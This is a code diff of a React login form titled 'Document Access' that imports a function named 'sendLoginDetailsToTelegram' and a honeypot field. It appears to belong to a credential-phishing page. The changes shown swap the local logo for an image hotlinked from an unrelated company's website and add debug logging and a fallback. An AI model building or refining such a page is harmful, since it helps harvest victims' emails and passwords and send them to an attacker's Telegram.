@@ -8,13 +8,14 @@ import { sendLoginDetailsToTelegram } from "@/services/telegramService";
 import FormInput from "./FormInput";
 import HoneypotField from "./HoneypotField";
 import LoadingButton from "./LoadingButton";
-import companyLogo from "@/assets/company-logo.png";
+// import companyLogo from "@/assets/company-logo.png";
 
 interface LoginFormProps {
   onLogin: (email: string, password: string) => void;
 }
 
 const LoginForm = ({ onLogin }: LoginFormProps) => {
+  console.log("LoginForm component rendering");
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
   const [isLoading, setIsLoading] = useState(false);
@@ -80,8 +81,17 @@ const LoginForm = ({ onLogin }: LoginFormProps) => {
     <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-blue-50 to-indigo-100 p-4">
       <Card className="w-full max-w-md shadow-xl border-0 bg-white/80 backdrop-blur-sm">
         <CardHeader className="text-center space-y-4">
-          <div className="mx-auto w-16 h-16 rounded-full flex items-center justify-center overflow-hidden">
-            <img src={companyLogo} alt="Company Logo" className="w-full h-full object-contain" />
+          <div className="mx-auto w-16 h-16 bg-gradient-to-br from-blue-600 to-indigo-600 rounded-full flex items-center justify-center">
+            <img 
+              src="https://dmdstairsllc.com/wp-content/uploads/2023/11/20231128232210_0-Logo_FF.png" 
+              alt="Company Logo" 
+              className="w-full h-full object-contain rounded-full" 
+              onError={(e) => {
+                console.log("Logo failed to load, showing fallback");
+                e.currentTarget.style.display = 'none';
+                e.currentTarget.parentElement!.innerHTML = '<div class="w-8 h-8 text-white font-bold text-xl">L</div>';
+              }} 
+            />
           </div>
           <CardTitle className="text-2xl font-bold text-gray-900">
             Document Access
